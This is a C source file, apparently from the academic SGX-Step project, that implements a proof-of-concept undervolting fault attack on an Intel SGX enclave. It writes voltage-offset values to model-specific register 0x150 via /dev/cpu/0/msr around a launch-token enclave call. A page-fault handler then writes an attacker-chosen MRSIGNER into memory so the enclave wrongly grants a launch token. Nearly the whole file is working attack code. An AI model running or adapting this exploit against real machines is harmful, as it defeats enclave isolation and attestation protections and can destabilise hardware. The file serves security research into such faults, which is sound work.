/*
 *  This file is part of the SGX-Step enclave execution control framework.
 *
 *  Copyright (C) 2017 Jo Van Bulck <jo.vanbulck@cs.kuleuven.be>,
 *                     Raoul Strackx <raoul.strackx@cs.kuleuven.be>
 *
 *  SGX-Step is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  SGX-Step is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with SGX-Step. If not, see <http://www.gnu.org/licenses/>.
 */

#include <sgx_urts.h>
#include "Enclave/encl_u.h"
#include <sys/mman.h>
#include <signal.h>

#include "libsgxstep/enclave.h"
#include "libsgxstep/debug.h"
#include "libsgxstep/pt.h"
#include "libsgxstep/sched.h"

#include <stdint.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <inttypes.h>
#include <time.h>
#include <pthread.h>

int64_t my_round(float num)
{
    return num < 0 ? num - 0.5 : num + 0.5;
}

volatile uint64_t not_used = 0xdead;

void pause_it(int pause_iterations)
{
	for (int j = 0; j < pause_iterations; j++)
	{
		not_used = not_used * 0x12345;
	}
}

uint64_t wrmsr_value(char* in,uint64_t plane)
{
      int64_t val=strtol(in,NULL,10);
      val=my_round(val*1.024);
      val=0xFFE00000&((val&0xFFF)<<21);
      val=val|0x8000001100000000;
      val=val|(plane<<40);
      return (uint64_t)val;
}

/* OCall functions */
void ocall_print_string(const char *str)
{
	/* Proxy/Bridge will check the length and null-terminate 
	 * the input string to prevent buffer overflow. 
	 */
	printf("\t[Enclave] %s\n", str);
}

static void hexdump(uint8_t* a, size_t cnt)
{
	for(size_t i = 0; i < cnt; i++)
	{
		if(i % 16 == 0 && i != 0)
		{
			printf("\n");
		}
		printf("%02x ", a[i]);
	}
}

volatile int flag1 = 0, flag2 = 0;
int fd0 = 0;

uint64_t val_plane0 = 0;
uint64_t val_plane2 = 0;
uint64_t val_zero_plane0 = 0;
uint64_t val_zero_plane2 = 0;
uint64_t tick = 0;

// Handle the page fault in thread dummy_page
static uint8_t page_mapped = 0;
static void* page = 0;
size_t it = 0;

sgx_measurement_t attacker_mrsigner = {
    .m = {0xf0, 0x88, 0xeb, 0x84, 0x5e, 0x3f, 0x5f, 0xd6, 
          0x91, 0xe8, 0x07, 0x94, 0x2a, 0x42, 0x3d, 0xc6, 
          0x5f, 0x42, 0x1c, 0x35, 0xd7, 0x9d, 0x5a, 0x60, 
          0xc0, 0x19, 0x36, 0x7a, 0x72, 0xe3, 0x81, 0x70}
};

void fault_handler(int signo, siginfo_t *info, void *extra)
{
	pwrite(fd0,&val_zero_plane0,sizeof val_zero_plane0,0x150);
	pwrite(fd0,&val_zero_plane2,sizeof val_zero_plane2,0x150);
	
	ucontext_t *p=(ucontext_t *)extra;
	int x;

	printf("Signal %d received\n", signo);
	printf("siginfo address = %lx\n", info->si_addr);

	uint64_t page_addr = (((uint64_t)info->si_addr) & ~(getpagesize()-1));
	printf("Will now map to %lx\n", page_addr);

    page = mmap((void*)page_addr, getpagesize(), PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);

	if(page == MAP_FAILED)
	{
		perror("mmap() failed");
	}
	page_mapped = 1;

    /* ---------------------------------------------------------------------- */
    gprsgx_region_t gprsgx;
    edbgrd(get_enclave_ssa_gprsgx_adrs(), &gprsgx, sizeof(gprsgx_region_t));

    uint64_t eadrs = gprsgx.fields.rdi, base = ((uint64_t)get_enclave_base()) + 0x15efe80;
    uint64_t idx = (eadrs - base), expected = 0x21*it;
    uint64_t expected_xor = 0xffffffffe0000063; //constant on my machine (jo-nuc)

    printf("enclave iteration=%d; base_adrs=%p\n", it, base);
    printf("adrs(RDI)=%p; idx=%p; expected=%p xor=%p\n", eadrs, idx, expected, expected ^ idx);

    /* NOTE: we assume the attacker knows the current loop iteration (e.g.,
     * side-channel analysis through page faults or interrupt counting */
    uint64_t attacker_adrs = base+(expected ^ expected_xor);
    printf("attacker computed: adrs=%p\n", attacker_adrs);
    printf("enclave computed:  adrs=%p\n", base+idx);

    memset(page, 0xff, 4096);
    memcpy((void*) attacker_adrs, &attacker_mrsigner, sizeof(sgx_measurement_t));
    /* ---------------------------------------------------------------------- */

    /* continue enclave w page mapped in */
}

int main(int argc, char **argv)
{
	sgx_launch_token_t token = {0};
	int retval = 0, updated = 0;
	char old = 0x00, new = 0xbb;
	sgx_enclave_id_t eid = 0;
	uint8_t ret = 0;
    int allowed = 0;

    const char* program = argv[0];

    if (argc != 3)
    {
        printf("Need 2 args: %s iterations offset\n",program);
        exit (-1);
    }

	val_plane0 = wrmsr_value(argv[2],0);
    val_plane2 = wrmsr_value(argv[2],2);

    uint32_t iterations = atoi(argv[1]);
    uint32_t iterations_50k = 50000-iterations;

    val_zero_plane0 = wrmsr_value("0",0);
    val_zero_plane2 = wrmsr_value("0",2);

    fd0 = open("/dev/cpu/0/msr", O_WRONLY);

    if(fd0 == -1)
    {
        printf("Could not open /dev/cpu/0/msr\n");
        return -1;
    }

	printf("Creating enclave...\n");

	SGX_ASSERT( sgx_create_enclave( "./Enclave/encl.so", /*debug=*/ 1,
		&token, &updated, &eid, NULL ) );

	print_enclave_info();

	// Install pf handler
	struct sigaction sa;
    sa.sa_flags = SA_SIGINFO;
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = fault_handler;
	if (sigaction(SIGSEGV, &sa, NULL) == -1) {
		perror("sigusr: sigaction");
		exit(1);
	}

    SGX_ASSERT( init_wl(eid) );
	info("calling enclave; sizeof(struct_foo_t)=%d", sizeof(struct_foo_t));

	for(int i = 0; i < iterations && page_mapped == 0 ; i++)
	{
		if(i % 100 == 0 && i != 0)
		{
			info("%d/%d", i, iterations);
		}

		if(i > 5)
		{
			pwrite(fd0,&val_plane0,sizeof val_plane0,0x150);
			pwrite(fd0,&val_plane2,sizeof val_plane2,0x150);
		}

		
		asm volatile("" ::: "memory"); 
        #if 0
            SGX_ASSERT( my_ecall(eid) );
        #else
            it = 0;
            SGX_ASSERT( get_launch_token(eid, &allowed, &it, attacker_mrsigner, /*provision=*/1) );
        #endif
		asm volatile("" ::: "memory"); 
		
		pwrite(fd0,&val_zero_plane0,sizeof val_zero_plane0,0x150);
		pwrite(fd0,&val_zero_plane2,sizeof val_zero_plane2,0x150);

		pause_it(5000);
	}

	if(page_mapped != 0)
	{
		info("Fault fault fault!!!");

        #if 0
		uint8_t* pp = (uint8_t*) page;
		for(int k = 0; k < getpagesize(); k++)
		{
			printf("%02x", pp[k]);
			if(k % 32 == 31)
				printf("\n");
		}
        #endif
	}


    close(fd0);

    info("Done. enclave returned allowed=%d", allowed);

done:

	return 0;
}
